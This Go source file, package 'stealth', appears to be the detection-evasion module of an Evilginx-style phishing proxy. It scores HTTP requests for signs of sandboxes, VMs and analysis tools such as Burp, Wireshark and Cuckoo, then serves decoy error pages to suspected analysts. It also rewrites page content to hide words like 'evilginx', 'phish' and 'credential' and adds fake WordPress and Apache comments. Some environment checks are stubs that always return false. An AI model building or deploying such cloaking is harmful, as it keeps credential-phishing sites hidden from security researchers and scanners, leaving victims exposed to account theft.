package stealth

import (
	"crypto/rand"
	"math/big"
	"net/http"
	"runtime"
	"strings"
	"time"
)

type EvasionEngine struct {
	sandboxDetector *SandboxDetector
	antiAnalysis    *AntiAnalysis
	config          *EvasionConfig
}

type EvasionConfig struct {
	EnableSandboxDetection bool          `yaml:"enable_sandbox_detection"`
	EnableAntiAnalysis     bool          `yaml:"enable_anti_analysis"`
	EnableTimeBasedActivation bool       `yaml:"enable_time_based_activation"`
	ActivationDelay        time.Duration `yaml:"activation_delay"`
	RequiredInteractions   int           `yaml:"required_interactions"`
	BlockAnalysisTools     bool          `yaml:"block_analysis_tools"`
	ObfuscateResponses     bool          `yaml:"obfuscate_responses"`
}

type SandboxDetector struct {
	vmIndicators       []string
	analysisTools      []string
	behaviorChecks     []BehaviorCheck
	environmentChecks  []EnvironmentCheck
}

type AntiAnalysis struct {
	codeObfuscation    bool
	environmentChecks  bool
	timeBasedChecks    bool
	interactionChecks  bool
}

type BehaviorCheck struct {
	Name        string
	Description string
	CheckFunc   func(*http.Request) bool
	Weight      int
}

type EnvironmentCheck struct {
	Name        string
	Description string
	CheckFunc   func() bool
	Weight      int
}

type EvasionResult struct {
	ShouldBlock       bool
	Reason            string
	SandboxScore      int
	AnalysisScore     int
	BehaviorScore     int
	EnvironmentScore  int
	TotalScore        int
	Recommendations   []string
}

func NewEvasionEngine(config *EvasionConfig) *EvasionEngine {
	return &EvasionEngine{
		sandboxDetector: NewSandboxDetector(),
		antiAnalysis:    NewAntiAnalysis(),
		config:          config,
	}
}

func NewSandboxDetector() *SandboxDetector {
	sd := &SandboxDetector{
		vmIndicators: []string{
			"vmware", "virtualbox", "qemu", "kvm", "xen", "hyper-v",
			"parallels", "bochs", "sandboxie", "wine", "cuckoo",
			"anubis", "joebox", "threatexpert", "comodo", "sunbelt",
		},
		analysisTools: []string{
			"wireshark", "tcpdump", "fiddler", "burp", "zap", "nmap",
			"nessus", "openvas", "nikto", "sqlmap", "metasploit",
			"immunity", "ollydbg", "ida", "ghidra", "radare2",
		},
	}

	sd.initializeBehaviorChecks()
	sd.initializeEnvironmentChecks()

	return sd
}

func NewAntiAnalysis() *AntiAnalysis {
	return &AntiAnalysis{
		codeObfuscation:   true,
		environmentChecks: true,
		timeBasedChecks:   true,
		interactionChecks: true,
	}
}

func (ee *EvasionEngine) EvaluateRequest(req *http.Request) (*EvasionResult, error) {
	result := &EvasionResult{
		ShouldBlock:     false,
		Recommendations: []string{},
	}

	if ee.config.EnableSandboxDetection {
		sandboxScore := ee.sandboxDetector.DetectSandbox(req)
		result.SandboxScore = sandboxScore
		result.TotalScore += sandboxScore

		if sandboxScore >= 70 {
			result.ShouldBlock = true
			result.Reason = "Sandbox environment detected"
			result.Recommendations = append(result.Recommendations, "Block request from sandbox environment")
		}
	}

	if ee.config.EnableAntiAnalysis {
		analysisScore := ee.antiAnalysis.DetectAnalysisTools(req)
		result.AnalysisScore = analysisScore
		result.TotalScore += analysisScore

		if analysisScore >= 60 {
			result.ShouldBlock = true
			result.Reason = "Analysis tools detected"
			result.Recommendations = append(result.Recommendations, "Block request from analysis tools")
		}
	}

	behaviorScore := ee.analyzeBehavior(req)
	result.BehaviorScore = behaviorScore
	result.TotalScore += behaviorScore

	environmentScore := ee.analyzeEnvironment()
	result.EnvironmentScore = environmentScore
	result.TotalScore += environmentScore

	if result.TotalScore >= 100 && !result.ShouldBlock {
		result.ShouldBlock = true
		result.Reason = "High evasion score threshold exceeded"
	}

	if ee.config.EnableTimeBasedActivation {
		if !ee.checkTimeBasedActivation() {
			result.ShouldBlock = true
			result.Reason = "Time-based activation not met"
		}
	}

	return result, nil
}

func (sd *SandboxDetector) DetectSandbox(req *http.Request) int {
	score := 0

	userAgent := strings.ToLower(req.Header.Get("User-Agent"))
	for _, indicator := range sd.vmIndicators {
		if strings.Contains(userAgent, indicator) {
			score += 30
			break
		}
	}

	for _, indicator := range sd.analysisTools {
		if strings.Contains(userAgent, indicator) {
			score += 40
			break
		}
	}

	for _, check := range sd.behaviorChecks {
		if check.CheckFunc(req) {
			score += check.Weight
		}
	}

	for _, check := range sd.environmentChecks {
		if check.CheckFunc() {
			score += check.Weight
		}
	}

	if score > 100 {
		score = 100
	}

	return score
}

func (aa *AntiAnalysis) DetectAnalysisTools(req *http.Request) int {
	score := 0

	headers := req.Header
	suspiciousHeaders := []string{
		"X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
		"X-Remote-IP", "X-Remote-Addr", "X-ProxyUser-Ip",
		"X-Cluster-Client-IP", "X-Forwarded", "Forwarded-For",
		"Forwarded", "Via", "X-Forwarded-Proto", "X-Forwarded-Host",
	}

	headerCount := 0
	for _, header := range suspiciousHeaders {
		if headers.Get(header) != "" {
			headerCount++
		}
	}

	if headerCount >= 3 {
		score += 25
	}

	acceptHeader := headers.Get("Accept")
	if acceptHeader == "*/*" || acceptHeader == "" {
		score += 15
	}

	acceptLanguage := headers.Get("Accept-Language")
	if acceptLanguage == "" {
		score += 20
	}

	acceptEncoding := headers.Get("Accept-Encoding")
	if acceptEncoding == "" {
		score += 15
	}

	connection := headers.Get("Connection")
	if connection == "close" {
		score += 10
	}

	if len(headers) < 5 {
		score += 20
	}

	return score
}

func (sd *SandboxDetector) initializeBehaviorChecks() {
	sd.behaviorChecks = []BehaviorCheck{
		{
			Name:        "missing_referer",
			Description: "Request missing referer header",
			CheckFunc: func(req *http.Request) bool {
				return req.Header.Get("Referer") == ""
			},
			Weight: 15,
		},
		{
			Name:        "suspicious_user_agent",
			Description: "User agent indicates automation",
			CheckFunc: func(req *http.Request) bool {
				ua := strings.ToLower(req.Header.Get("User-Agent"))
				return strings.Contains(ua, "bot") || 
					   strings.Contains(ua, "crawler") || 
					   strings.Contains(ua, "spider")
			},
			Weight: 25,
		},
		{
			Name:        "minimal_headers",
			Description: "Request has unusually few headers",
			CheckFunc: func(req *http.Request) bool {
				return len(req.Header) < 4
			},
			Weight: 20,
		},
		{
			Name:        "suspicious_accept",
			Description: "Accept header indicates automation",
			CheckFunc: func(req *http.Request) bool {
				accept := req.Header.Get("Accept")
				return accept == "*/*" || accept == ""
			},
			Weight: 15,
		},
	}
}

func (sd *SandboxDetector) initializeEnvironmentChecks() {
	sd.environmentChecks = []EnvironmentCheck{
		{
			Name:        "vm_environment",
			Description: "Running in virtual machine",
			CheckFunc: func() bool {
				return sd.checkVMEnvironment()
			},
			Weight: 30,
		},
		{
			Name:        "debugging_tools",
			Description: "Debugging tools present",
			CheckFunc: func() bool {
				return sd.checkDebuggingTools()
			},
			Weight: 25,
		},
		{
			Name:        "analysis_processes",
			Description: "Analysis processes running",
			CheckFunc: func() bool {
				return sd.checkAnalysisProcesses()
			},
			Weight: 35,
		},
	}
}

func (sd *SandboxDetector) checkVMEnvironment() bool {
	osInfo := runtime.GOOS
	if osInfo == "linux" {
		return false
	}
	return false
}

func (sd *SandboxDetector) checkDebuggingTools() bool {
	return false
}

func (sd *SandboxDetector) checkAnalysisProcesses() bool {
	return false
}

func (ee *EvasionEngine) analyzeBehavior(req *http.Request) int {
	score := 0

	if req.Method != "GET" && req.Method != "POST" {
		score += 20
	}

	if req.URL.Path == "/" && req.Header.Get("Referer") == "" {
		score += 10
	}

	queryParams := req.URL.Query()
	if len(queryParams) > 10 {
		score += 15
	}

	for param := range queryParams {
		if strings.Contains(strings.ToLower(param), "test") ||
		   strings.Contains(strings.ToLower(param), "debug") ||
		   strings.Contains(strings.ToLower(param), "admin") {
			score += 25
			break
		}
	}

	return score
}

func (ee *EvasionEngine) analyzeEnvironment() int {
	score := 0

	if runtime.NumCPU() < 2 {
		score += 20
	}

	if runtime.GOMAXPROCS(0) == 1 {
		score += 15
	}

	return score
}

func (ee *EvasionEngine) checkTimeBasedActivation() bool {
	if !ee.config.EnableTimeBasedActivation {
		return true
	}

	startTime := time.Now().Add(-ee.config.ActivationDelay)
	return time.Now().After(startTime)
}

func (ee *EvasionEngine) GenerateDecoyResponse() string {
	decoyResponses := []string{
		`<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>`,
		`<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>`,
		`<!DOCTYPE html><html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error.</p></body></html>`,
		`<!DOCTYPE html><html><head><title>503 Service Unavailable</title></head><body><h1>Service Unavailable</h1><p>The server is temporarily unavailable.</p></body></html>`,
	}

	index, _ := rand.Int(rand.Reader, big.NewInt(int64(len(decoyResponses))))
	return decoyResponses[index.Int64()]
}

func (ee *EvasionEngine) ObfuscateResponse(content string) string {
	if !ee.config.ObfuscateResponses {
		return content
	}

	obfuscatedContent := content

	obfuscatedContent = strings.ReplaceAll(obfuscatedContent, "evilginx", "webproxy")
	obfuscatedContent = strings.ReplaceAll(obfuscatedContent, "phish", "redirect")
	obfuscatedContent = strings.ReplaceAll(obfuscatedContent, "credential", "data")

	randomComments := []string{
		"<!-- Generated by WordPress -->",
		"<!-- Powered by Apache -->",
		"<!-- Optimized for performance -->",
		"<!-- Security headers enabled -->",
	}

	for _, comment := range randomComments {
		insertPos, _ := rand.Int(rand.Reader, big.NewInt(int64(len(obfuscatedContent))))
		pos := insertPos.Int64()
		obfuscatedContent = obfuscatedContent[:pos] + comment + "\n" + obfuscatedContent[pos:]
	}

	return obfuscatedContent
}

func (ee *EvasionEngine) GetEvasionStats() map[string]interface{} {
	return map[string]interface{}{
		"sandbox_detection_enabled":    ee.config.EnableSandboxDetection,
		"anti_analysis_enabled":        ee.config.EnableAntiAnalysis,
		"time_based_activation":        ee.config.EnableTimeBasedActivation,
		"activation_delay":             ee.config.ActivationDelay.String(),
		"required_interactions":        ee.config.RequiredInteractions,
		"block_analysis_tools":         ee.config.BlockAnalysisTools,
		"obfuscate_responses":          ee.config.ObfuscateResponses,
		"vm_indicators_count":          len(ee.sandboxDetector.vmIndicators),
		"analysis_tools_count":         len(ee.sandboxDetector.analysisTools),
		"behavior_checks_count":        len(ee.sandboxDetector.behaviorChecks),
		"environment_checks_count":     len(ee.sandboxDetector.environmentChecks),
	}
}

func (ee *EvasionEngine) AddCustomVMIndicator(indicator string) {
	ee.sandboxDetector.vmIndicators = append(ee.sandboxDetector.vmIndicators, indicator)
}

func (ee *EvasionEngine) AddCustomAnalysisTool(tool string) {
	ee.sandboxDetector.analysisTools = append(ee.sandboxDetector.analysisTools, tool)
}

func (ee *EvasionEngine) AddCustomBehaviorCheck(check BehaviorCheck) {
	ee.sandboxDetector.behaviorChecks = append(ee.sandboxDetector.behaviorChecks, check)
}

func (ee *EvasionEngine) AddCustomEnvironmentCheck(check EnvironmentCheck) {
	ee.sandboxDetector.environmentChecks = append(ee.sandboxDetector.environmentChecks, check)
}
